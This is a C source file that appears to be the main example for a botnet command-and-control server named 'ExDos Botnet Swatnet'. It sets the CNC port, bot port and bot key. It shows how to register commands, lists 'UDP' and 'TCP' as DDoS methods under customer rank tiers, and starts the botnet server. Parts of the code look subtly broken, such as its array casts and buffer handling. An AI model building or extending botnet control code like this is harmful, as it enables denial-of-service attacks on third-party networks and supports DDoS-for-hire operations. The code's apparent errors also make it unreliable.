#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <locale.h>

#include "headers/cogs.h"
#include "headers/__init__.h"

#include <clib/String/str.h>

//
//  Declare Global Variables For CNC Information
//
//  PS: 
//      - To host on your default IP, keep CNC_IP to NULL
//      - If you use the bot server by setting a port, you must
//        set a bot key also!
//
str *CNC_IP         = NULL;
str *PORT           = NULL;
str *THEME_NAME     = NULL;
str *BOT_PORT       = NULL;
str *BOT_KEY        = NULL;

//
//  **THIS FUNCTIONS IS USED TO DEMONSTRATE HOW TO ADD COMMANDS TO THE COGS SYSTEM**
//  PS: Your command information variables can be placed in another file
//
//  Include these library for the arguments passed to your function
//      - <clib/String/str.h>
//          See the header for more: /usr/local/include/clib/String/str.h
//      - <clib/Array/str.h>
//          See the header for more: /usr/local/include/clib/Array/arr.h
//
//  Ensure you add these argument that will be passed to your function
//      - (void *x, void *c, str *Cmd, Arr *Args)
//
const char *TEST_CMD_ALIAS[] = {"test", NULL};
const int TEST_CMD_ARGS = 0;
const int TEST_CMD_RANK_LEVEL = 0; // 0 = free command (Not premium, reseller, admin or owner command)
void test_cmd(void *x, void *c, str *cmd, Arr *Args) {
    place_text(((Client *)c)->sock, string("11"), string("35"), string("TEST COMMAND RESPONSE"));
}

//
//  Declare a global Cogs variable and construct it with your own function as the 
//  example shown below
//
Cogs *cogs = NULL;
void ConstructBotnet() {
    PORT = string("1337");
    THEME_NAME = string("1337");

    cogs = InitCogs();

    // Simply add your command here ( USAGE: cogs->Add(Cogs *c, const char **alias, const int max_argc, const int rank, void *fn); )
    cogs->Add(cogs, Array((char **)TEST_CMD_ALIAS), TEST_CMD_ARGS, TEST_CMD_RANK_LEVEL, test_cmd);

    char *METHODS[] = {"UDP", "TCP", NULL}; // Used as an example (this would be with your ddos command)
    // Add all methods from your array of methods linking to method handler command
    for(int i = 0; i < count_arr(METHODS); i++) {
        cogs->Add(cogs, Array(((char *){METHODS[i], NULL})), 4, 1, NULL);
    }
}

int main(int argc, char *argv[]) {
    setlocale(LC_ALL, ""); // Temporary fix for thread signal and crash handling

    ConstructBotnet();
    ExDos *Dos = start_up_exDos(NULL, PORT, THEME_NAME, BOT_PORT, BOT_KEY, cogs);
    if(!Dos) {
        printf("[ x ] Error, Unable to load ExDos Botnet Swatnet....!\n");
        return -1;
    }

    char *buffer[100];
    printf("Press any key to exit\n");
    fgets(&buffer, 100, stdin); // keep blocking until something is pressed
    return 0;
}